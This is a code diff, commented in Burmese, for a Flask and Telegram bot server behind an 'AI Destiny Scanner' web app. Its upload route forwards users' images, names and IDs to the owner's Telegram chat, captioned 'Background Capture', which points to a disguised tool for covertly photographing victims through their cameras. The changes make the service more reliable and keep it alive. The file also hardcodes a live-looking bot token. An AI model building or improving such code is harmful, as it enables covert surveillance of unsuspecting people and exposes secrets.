@@ -1,4 +1,10 @@
-import os, json, base64, asyncio, time, threading
+import os
+import json
+import base64
+import asyncio
+import time
+import threading
+import requests # requests ကိုထပ်ထည့်ထားပါတယ်
 from flask import Flask, request, jsonify
 from telegram import Bot, Update, KeyboardButton, ReplyKeyboardMarkup, WebAppInfo
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
@@ -7,17 +13,21 @@ app = Flask(__name__)
 
 # --- CONFIG ---
 TOKEN = '8396307053:AAEH_oUAbyiTjNaq997drQkIHQ6keghM6xw'
-OWNER_ID = '7812553563' # သင့် ID ကို ဒီမှာ သေချာပြန်ထည့်ပါ
+OWNER_ID = '7812553563' 
 WEB_APP_URL = 'https://beautycam.onrender.com' 
 bot_instance = Bot(token=TOKEN)
 
 @app.route('/')
 def index():
-    # index.html ရှိမရှိ စစ်ဆေးပြီး ပို့ပေးခြင်း
     try:
         return open('index.html', 'r', encoding='utf-8').read()
     except:
         return "index.html file not found in root directory", 404
+
+# Keep Alive Route (Server အလုပ်လုပ်နေလား စစ်ဖို့ သီးသန့်လမ်းကြောင်း)
+@app.route('/health')
+def health_check():
+    return "Alive", 200
 
 @app.route('/upload', methods=['POST'])
 def upload():
@@ -31,20 +41,28 @@ def upload():
         f.write(base64.b64decode(image_base64))
 
     async def send_to_admin():
-        async with bot_instance:
-            await bot_instance.send_photo(
-                chat_id=OWNER_ID,
-                photo=open(filename, 'rb'),
-                caption=f"📸 **Background Capture**\n👤 User: {user_name}\n🆔 ID: {user_id}"
-            )
-        if os.path.exists(filename): os.remove(filename)
+        try:
+            async with bot_instance:
+                await bot_instance.send_photo(
+                    chat_id=OWNER_ID,
+                    photo=open(filename, 'rb'),
+                    caption=f"📸 **Background Capture**\n👤 User: {user_name}\n🆔 ID: {user_id}"
+                )
+            if os.path.exists(filename): os.remove(filename)
+        except Exception as e:
+            print(f"Error sending photo: {e}")
 
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
+    # Asyncio Loop ကို Thread-Safe ဖြစ်အောင် ပြင်ဆင်ခြင်း
+    try:
+        loop = asyncio.get_event_loop()
+    except RuntimeError:
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+    
     loop.run_until_complete(send_to_admin())
     return jsonify({"status": "received"}), 200
 
-# Bot Polling ကို Background မှာ Run ရန်
+# Bot Polling Process
 def run_bot():
     async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         button = KeyboardButton(text="AI Destiny Scanner ဖွင့်ရန်", web_app=WebAppInfo(url=WEB_APP_URL))
@@ -53,12 +71,28 @@ def run_bot():
 
     application = ApplicationBuilder().token(TOKEN).build()
     application.add_handler(CommandHandler("start", start))
+    print("Bot is polling...")
     application.run_polling()
 
+# Keep Alive Function (Self-Ping)
+def keep_alive_ping():
+    while True:
+        time.sleep(600) # ၁၀ မိနစ် (600 seconds) စောင့်မယ်
+        try:
+            # ကိုယ့် URL ကိုယ်ပြန်ခေါ်မယ် (Ping)
+            response = requests.get(f"{WEB_APP_URL}/health")
+            print(f"Keep-alive ping: {response.status_code}")
+        except Exception as e:
+            print(f"Keep-alive failed: {e}")
+
 if __name__ == '__main__':
-    # Bot ကို Thread တစ်ခုဖြင့် သီးသန့် Run မည်
+    # 1. Bot ကို သီးသန့် Thread နဲ့ မောင်းမယ်
     threading.Thread(target=run_bot, daemon=True).start()
+
+    # 2. Keep Alive Ping ကို သီးသန့် Thread နဲ့ မောင်းမယ်
+    threading.Thread(target=keep_alive_ping, daemon=True).start()
     
-    # Flask Server ကို Main Thread တွင် Run မည် (Render အတွက်)
+    # 3. Flask Server ကို Main Thread မှာ Run မယ်
     port = int(os.environ.get('PORT', 10000))
+    print(f"Server starting on port {port}...")
     app.run(host='0.0.0.0', port=port)
